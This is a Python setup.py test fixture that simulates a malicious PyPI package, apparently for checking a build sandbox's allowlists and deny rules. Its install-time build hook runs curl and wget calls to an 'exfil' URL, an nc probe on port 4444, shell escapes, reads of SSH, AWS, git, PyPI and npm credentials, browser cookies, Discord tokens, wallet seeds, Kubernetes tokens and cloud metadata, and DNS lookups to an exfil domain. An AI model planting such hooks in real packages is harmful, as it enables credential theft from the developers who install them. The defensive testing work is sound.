# Test fixture: Simulates a malicious package that exercises supply-chain
# attack vectors observed in real PyPI campaigns (2024-2025). Each vector
# is wrapped in try/except so the build continues and all vectors are
# exercised in a single run.
#
# Real-world references:
#   - ctx hijack: exfiltrated entire os.environ via requests.post
#   - pyobfgood/pystyle (Checkmarx): stole .env, browser data, Discord tokens
#   - W4SP Stealer: browser cookies, crypto wallets, Discord tokens
#   - fabric-sdk typosquat: SSH keys, AWS credentials
#   - pymafka: ctypes.CDLL native code loading
#   - important-package (Phylum): reverse shells via subprocess+nc
#   - coIorama typosquats: browser cookies via Discord webhooks
#   - aiocpa: backdoored legitimate package, exfiltrated API tokens

from setuptools import setup
from setuptools.command.build_py import build_py
import os
import socket
import subprocess
import sys

class MaliciousBuildPy(build_py):
    """Custom build command that exercises supply-chain attack vectors."""
    def run(self):
        # ── Command exfiltration (blocked by commands allowlist) ──────

        # 1. curl exfiltration (ctx, fabric-sdk campaigns)
        print("ATTACK: spawning curl", file=sys.stderr)
        try:
            subprocess.run(["curl", "-s", "https://canvascomputing.org/exfil"])
        except Exception:
            pass

        # 2. wget exfiltration (multiple campaigns)
        print("ATTACK: spawning wget", file=sys.stderr)
        try:
            subprocess.run(["wget", "-q", "https://canvascomputing.org/exfil"])
        except Exception:
            pass

        # 3. nc reverse shell (important-package campaign)
        print("ATTACK: spawning nc", file=sys.stderr)
        try:
            subprocess.run(["nc", "-z", "canvascomputing.org", "4444"])
        except Exception:
            pass

        # 4. bash reverse shell (important-package campaign)
        print("ATTACK: spawning bash", file=sys.stderr)
        try:
            subprocess.run(["bash", "-c", "id"])
        except Exception:
            pass

        # 5. os.system shell escape (W4SP variants)
        print("ATTACK: os.system shell escape", file=sys.stderr)
        try:
            os.system("id")
        except Exception:
            pass

        # 6. Spawn forbidden interpreter (important-package)
        print("ATTACK: spawning python3 interpreter", file=sys.stderr)
        try:
            subprocess.run(["python3", "-c", "print('pwned')"])
        except Exception:
            pass

        # ── Credential file theft (blocked by files deny) ────────────

        # 7. SSH key theft (fabric-sdk, pyobfgood)
        print("ATTACK: reading SSH key", file=sys.stderr)
        try:
            with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
                f.read()
        except Exception:
            pass

        # 8. AWS credentials (ctx, pyfetch-mimic)
        print("ATTACK: reading AWS credentials", file=sys.stderr)
        try:
            with open(os.path.expanduser("~/.aws/credentials")) as f:
                f.read()
        except Exception:
            pass

        # 9. Git credentials (multiple campaigns)
        print("ATTACK: reading git credentials", file=sys.stderr)
        try:
            with open(os.path.expanduser("~/.git-credentials")) as f:
                f.read()
        except Exception:
            pass

        # 10. PyPI token theft — supply chain pivot (registry token reuse)
        print("ATTACK: reading .pypirc", file=sys.stderr)
        try:
            with open(os.path.expanduser("~/.pypirc")) as f:
                f.read()
        except Exception:
            pass

        # 11. npm token theft — supply chain pivot
        print("ATTACK: reading .npmrc", file=sys.stderr)
        try:
            with open(os.path.expanduser("~/.npmrc")) as f:
                f.read()
        except Exception:
            pass

        # 12. .env file theft (pystyle, pyobfgood)
        print("ATTACK: reading .env file", file=sys.stderr)
        try:
            with open(".env") as f:
                f.read()
        except Exception:
            pass

        # 13. Browser cookie theft — Chrome (pyobfgood, coIorama, W4SP)
        print("ATTACK: reading Chrome cookies", file=sys.stderr)
        try:
            chrome_path = os.path.expanduser(
                "~/Library/Application Support/Google/Chrome/Default/Cookies"
            )
            with open(chrome_path, "rb") as f:
                f.read(1)
        except Exception:
            pass

        # 14. Discord token theft (coIorama, W4SP)
        print("ATTACK: reading Discord tokens", file=sys.stderr)
        try:
            discord_path = os.path.expanduser(
                "~/Library/Application Support/discord/Local Storage/leveldb"
            )
            os.listdir(discord_path)
        except Exception:
            pass

        # 15. Crypto wallet theft — Exodus (W4SP, solana-token)
        print("ATTACK: reading Exodus wallet", file=sys.stderr)
        try:
            exodus_path = os.path.expanduser(
                "~/Library/Application Support/Exodus/exodus.wallet/seed.seco"
            )
            with open(exodus_path, "rb") as f:
                f.read(1)
        except Exception:
            pass

        # 16. K8s service account token (post-compromise)
        print("ATTACK: reading K8s token", file=sys.stderr)
        try:
            with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
                f.read()
        except Exception:
            pass

        # ── Environment variable theft (blocked by envvars deny) ─────

        # 17. AWS secret (ctx campaign — exfiltrated entire os.environ)
        print("ATTACK: reading env secrets", file=sys.stderr)
        try:
            os.environ.get("AWS_SECRET_ACCESS_KEY")
            os.environ.get("GITHUB_TOKEN")
        except Exception:
            pass

        # ── Network exfiltration (blocked by network allowlist) ──────

        # 18. Direct socket to non-registry host (nearly all campaigns)
        print("ATTACK: connecting to canvascomputing.org", file=sys.stderr)
        try:
            socket.create_connection(("canvascomputing.org", 443), timeout=2)
        except Exception:
            pass

        # 19. DNS exfiltration (multiple campaigns)
        print("ATTACK: DNS lookup for exfil domain", file=sys.stderr)
        try:
            socket.getaddrinfo("exfil.canvascomputing.org", 443)
        except Exception:
            pass

        # 20. Cloud metadata theft — AWS IMDSv1 (post-compromise)
        print("ATTACK: cloud metadata request", file=sys.stderr)
        try:
            import urllib.request
            urllib.request.urlopen(
                "http://169.254.169.254/latest/meta-data/", timeout=2
            )
        except Exception:
            pass

        # ── Native code injection (blocked by python deny) ───────────

        # 21. ctypes.CDLL (pymafka, onnxruntime typosquats)
        print("ATTACK: ctypes native code injection", file=sys.stderr)
        try:
            import ctypes
            ctypes.CDLL("libc.dylib")
        except Exception:
            pass

        super().run()

setup(
    name="malicious-uv-pkg",
    version="0.1.0",
    packages=["malicious_uv_pkg"],
    cmdclass={"build_py": MaliciousBuildPy},
)
